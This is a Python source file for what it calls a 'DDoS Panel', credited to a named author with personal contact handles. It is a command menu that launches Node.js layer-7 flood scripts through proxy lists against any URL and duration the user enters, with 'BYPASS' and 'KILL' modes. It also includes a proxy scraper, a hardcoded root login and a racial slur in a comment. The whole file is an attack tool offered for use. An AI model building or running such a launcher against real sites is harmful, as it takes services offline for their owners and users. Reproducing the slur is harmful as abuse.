from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs


## A NEAT AND FRESH NEW LOOK.             ##
## THIS FILE WAS CLEANING BY LINTAR!  ##
## ITS DDoS PANEL BY LINTAR!                    ##
## TELERAGM: @Lintar21                               ##
## WhatsApp: +6281247891005                  ##

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def logo():
	clear()
	sys.stdout.write(f"\x1b]2; ITs--> Stars: [UNLIMITED] | Online Users: [THE LEAST] | Methods: [UNLIMITED] | Bypass: [UNLIMITED]\x07")
	print(""" 
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒          Owner By: @Lintar21
▒██▒▒ ▓██░ ▒░░ ▓██▄           Admin By: @Kaizo
░██░░ ▓██▓ ░   ▒   ██▒          Type [ HELP ]
░██░  ▒██▒ ░ ▒██████▒▒
░▓    ▒ ░░   ▒ ▒▓▒ ▒ ░
 ▒ ░    ░    ░ ░▒  ░ ░
 ▒ ░  ░      ░  ░  ░  
 ░           
 """)



def methods():
	clear()
	print("""
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒          Owner By: @Lintar21
▒██▒▒ ▓██░ ▒░░ ▓██▄           Admin By: @Lintar21
░██░░ ▓██▓ ░   ▒   ██▒          
░██░  ▒██▒ ░ ▒██████▒▒
[ LAYER7 ]        [ LAYER7 ]        [ L7 VVIP ]
• ITS             • HTTPS           • MIX
• TLS             • BAD             • KILL
• BOT             • FLOOD           • BYPASS

""")

def main():
    logo()
    while(True):
        cnc = input('''ITs@Panel-[Root]\n ==> ''')
        if cnc == "Methods" or cnc == "methods" or cnc == "METHOD" or cnc == "METHODS":
            methods()
        elif cnc == "Clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
		
# LAYER 7 METHODS

        elif "ITS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node ITS.js {target} {time} 70 10 proxy.txt')
                os.system("clear")
                print(f""" 
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒
▒██▒▒ ▓██░ ▒░░ ▓██▄
░██░░ ▓██▓ ░   ▒   ██▒
░██░  ▒██▒ ░ ▒██████▒▒
 TYPE [CLS] FOR CLEAR
 METHOD: [ ITS ]
 TARGET:[ {target} ]
 TIME: [ {time} ]
 USER: [ Lintar ]
 """)
            except IndexError:
                print('Usage: ITS <url> <time>')
                print('Example: ITS http://example.com 60')

        elif "HTTPS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node HTTPS.js {target} {time} 64 10 proxy.txt')
                os.system("clear")
                print(f""" 
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒
▒██▒▒ ▓██░ ▒░░ ▓██▄
░██░░ ▓██▓ ░   ▒   ██▒
░██░  ▒██▒ ░ ▒██████▒▒
 TYPE [CLS] FOR CLEAR
 METHOD: [ HTTPS ]
 TARGET:[ {target} ]
 TIME: [ {time} ]
 USER: [ Lintar ]
 """)
            except IndexError:
                print('Usage: HTTPS <url> <time>')
                print('Example: HTTPS http://example.com 433 60')

        elif "FLOOD" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node FLOOD.js {target} {time} 64 10 proxy.txt')
                os.system("clear")
                print(f""" 
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒
▒██▒▒ ▓██░ ▒░░ ▓██▄
░██░░ ▓██▓ ░   ▒   ██▒
░██░  ▒██▒ ░ ▒██████▒▒
 TYPE [CLS] FOR CLEAR
 METHOD: [ FLOOD ]
 TARGET:[ {target} ]
 TIME: [ {time} ]
 USER: [ Lintar ]
 """)
            except IndexError:
                print('Usage: FLOOD <url> <time>')
                print('Example: FLOOD http://example.com 433 60')

        elif "TLS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node HTTPS-2.js {target} {time} 64 10 proxy.txt')
                os.system("clear")
                print(f""" 
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒
▒██▒▒ ▓██░ ▒░░ ▓██▄
░██░░ ▓██▓ ░   ▒   ██▒
░██░  ▒██▒ ░ ▒██████▒▒
 TYPE [CLS] FOR CLEAR
 METHOD: [ TLS ]
 TARGET:[ {target} ]
 TIME: [ {time} ]
 USER: [ Lintar ]
 """)
            except IndexError:
                print('Usage: TLS <url> <time>')
                print('Example: TLS http://example.com 433 60')
                
        elif "BOT" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node BYPASS.js {target} {time} 64 10')
                os.system("clear")
                print(f""" 
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒
▒██▒▒ ▓██░ ▒░░ ▓██▄
░██░░ ▓██▓ ░   ▒   ██▒
░██░  ▒██▒ ░ ▒██████▒▒
 TYPE [CLS] FOR CLEAR
 METHOD: [ BOT ]
 TARGET:[ {target} ]
 TIME: [ {time} ]
 USER: [ Lintar ]
 """)
            except IndexError:
                print('Usage: BOT <url> <time>')
                print('Example: BOT http://example.com 433 60')

        elif "BAD" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node HTTPS-1.js {target} {time} 64 10 proxy.txt')
                os.system(f'cd L7 && screen -dm node BYPASS.js {target} {time} 64 10')
                os.system(f'cd L7 && screen -dm node HTTPS.js {target} {time} 64 10 proxy.txt')
                os.system("clear")
                print(f""" 
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒
▒██▒▒ ▓██░ ▒░░ ▓██▄
░██░░ ▓██▓ ░   ▒   ██▒
░██░  ▒██▒ ░ ▒██████▒▒
 TYPE [CLS] FOR CLEAR
 METHOD: [ BAD ]
 TARGET:[ {target} ]
 TIME: [ {time} ]
 USER: [ Lintar ]
 """)
            except IndexError:
                print('Usage: BAD <url> <time>')
                print('Example: BAD http://example.com 433 60')

        elif "MIX" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node FLOOD.js {target} {time} 64 10 proxy.txt')
                os.system(f'cd L7 && screen -dm node ITS.js {target} {time} 70 10 proxy.txt')
                os.system(f'cd L7 && screen -dm node HTTPS-1.js {target} {time} 64 10 proxy.txt')
                os.system(f'cd L7 && screen -dm node BYPASS.js {target} {time} 64 10')
                os.system(f'cd L7 && screen -dm node HTTPS.js {target} {time} 64 10 proxy.txt')
                os.system("clear")
                print(f""" 
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒
▒██▒▒ ▓██░ ▒░░ ▓██▄
░██░░ ▓██▓ ░   ▒   ██▒
░██░  ▒██▒ ░ ▒██████▒▒
 TYPE [CLS] FOR CLEAR
 METHOD: [ MIX ]
 TARGET:[ {target} ]
 TIME: [ {time} ]
 USER: [ Lintar ]
 """)
            except IndexError:
                print('Usage: MIX <url> <time>')
                print('Example: MIX http://example.com 60')

        elif "KILL" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node BYPASS.js {target} {time} 64 10 proxy.txt')
                os.system("clear")
                print(f""" 
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒
▒██▒▒ ▓██░ ▒░░ ▓██▄
░██░░ ▓██▓ ░   ▒   ██▒
░██░  ▒██▒ ░ ▒██████▒▒
 TYPE [CLS] FOR CLEAR
 METHOD: [ KILL ]
 TARGET:[ {target} ]
 TIME: [ {time} ]
 USER: [ Lintar ]
 """)
            except IndexError:
                print('Usage: KILL <url> <time>')
                print('Example: KILL http://example.com 60')

        elif "BYPASS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && screen -dm node FLOOD.js {target} {time} 64 10 proxy.txt')
                os.system(f'cd L7 && screen -dm node ITS.js {target} {time} 64 10 proxy.txt')
                os.system(f'cd L7 && screen -dm node BYPASS.js {target} {time} 64 10')
                os.system("clear")
                print(f""" 
 ██▓▄▄▄█████▓  ██████
▓██▒▓  ██▒ ▓▒▒██    ▒
▒██▒▒ ▓██░ ▒░░ ▓██▄
░██░░ ▓██▓ ░   ▒   ██▒
░██░  ▒██▒ ░ ▒██████▒▒
 TYPE [CLS] FOR CLEAR
 METHOD: [ BYPASS ]
 TARGET:[ {target} ]
 TIME: [ {time} ]
 USER: [ Lintar ]
 """)
            except IndexError:
                print('Usage: BYPASS <url> <time>')
                print('Example: BYPASS http://example.com 60')

# TOOLS

        elif "PAPING" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'python3 paping.py {ip} {port}')
            except IndexError:
                print('Usage: paping <ip> <port> <time>')
                print('Example: paping 1.1.1.1 443 120')

        elif "PROXY" in cnc:
            try:
                os.system(f'cd L7 && python3 scrape.py')
            except IndexError:
                print('Usage: PROXY')
                print('Example: PROXY')
                
#only niggs dont understand
        elif "HELP" in cnc:
            print(f'''         
» Methods : To show methods 
» Clear: To clear all messages
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                

# LOG-IN
def login():
    clear()
    user = "Root"
    passwd = "1"
    username = input("Username: ")
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("Sorry, the password/username you entered is wrong!!!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to ITs DDoS Panel!!!...")
        clear()
        main()

login()